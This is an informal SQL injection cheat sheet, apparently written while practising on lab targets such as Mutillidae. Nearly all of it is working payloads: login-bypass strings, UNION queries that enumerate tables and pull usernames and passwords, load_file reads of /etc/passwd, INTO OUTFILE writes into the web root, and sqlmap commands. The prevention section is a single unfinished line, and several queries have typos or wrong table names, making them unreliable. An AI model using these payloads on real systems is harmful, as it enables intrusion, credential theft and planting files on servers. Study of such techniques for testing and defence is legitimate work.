logging in:
mysql -u root -h 10.10.10.10 

show tables; show database;use :database:; select * from accounts; 

Finding:
use things like ' , order by , and -> enter these in boxes

POST
select * from accounts where username = 'axasd' and password = '$password' <- backend
so we inject -> 123456' and 1=1 # <- hash is for comment and leads to ignorance of last open quote
hence           1. 123456' code here#                      to bypass login -> aaa; or 1=1 # ( -- is comment too in mysql)
                2. username' #    <- puts the entire password field as comment
GET( sent in url)
we inject in url -> index.php?page=user.info.php&username=karan    ' order by 1 #    &password..........



union <- since we using multiple from url0)  select 1,2,3,4           <- enter this whole in url
union 1, database(), user(), version(), 5

FINDING DATABASE TABLES:
  union+select+1,table_name,null,null,5+from+information_schema.tables <-contains all table name
    union+select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'
FINDING NUMBER OF COLUMNS IN A DATABASE
  ' ORDER BY 1--
  ' UNION SELECT NULL--
EXTRACTING SENSITIVE DATA:
    union select 1,coulumn_name,null,null,5 from information_schema.columns where thable_name = accounts
      union select 1,username,password,is_admin,5 from information_schema.tables
 
 Finding columns with a useful data type in an SQL injection UNION attack    
      UNION SELECT 'a',NULL,NULL,NULL--
 READING AND EXTRACTING FILES: 
    union select null,load_file('/etc/passwd'),null,null,null
    union select null,'CODE HERE',null,null,null into outfile '/var/www/mutillidae/example.txt'<- if acecess denied write in /tmp/
    
  SQL MAP:  
  sqlmap -u "       "
  sqlmap --help
  
  PREVENTION:
1. filters by passed easily
2. blacklist and white list also can be bypassed
so best way 
   coding backend
        
